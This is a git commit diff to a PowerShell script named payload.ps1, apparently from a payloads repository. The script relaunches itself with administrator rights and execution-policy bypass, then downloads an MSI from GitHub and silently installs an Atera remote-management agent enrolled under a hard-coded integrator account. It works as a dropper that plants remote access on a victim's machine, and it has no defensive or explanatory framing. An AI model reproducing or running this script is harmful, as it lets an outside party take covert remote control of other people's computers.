88811bfc66f1122b287f152b0b4f1d9e80705b56
T1Cr4azy <85311985+T1Cr4azy@users.noreply.github.com>
2023-06-08 07:55:36 -0300

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,12 +1,26 @@
+$serviceName = "AteraAgent"
+
+# Verificar se o serviço "AteraAgent" está em execução
+$service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
+
+if ($service -eq $null) {
+    # Solicitar privilégios administrativos
+    $scriptPath = $MyInvocation.MyCommand.Path
+    $arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
+    Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs
+    Exit
+}
+
+# Parte principal do código
 $downloadURL = 'https://github.com/T1Cr4azy/Payloads____/raw/main/setup.msi'
 $downloadPath = "$env:USERPROFILE\Desktop\setup.msi"
 
-# Download the MSI file using the 'Invoke-WebRequest' cmdlet
+# Download do arquivo MSI usando o cmdlet 'Invoke-WebRequest'
 Invoke-WebRequest -Uri $downloadURL -OutFile $downloadPath
 
-# Check if the download completed successfully
+# Verificar se o download foi concluído com sucesso
 if (Test-Path $downloadPath) {
-    # Run MSI file with arguments for silent installation
+    # Executar o arquivo MSI com os argumentos para instalação silenciosa
     Start-Process -FilePath msiexec.exe -ArgumentList "/i `"$downloadPath`" /qn IntegratorLogin=admin@unisonagency.net CompanyId=1" -NoNewWindow -Wait
 } else {
     Write-Host "Falha ao baixar o arquivo MSI."
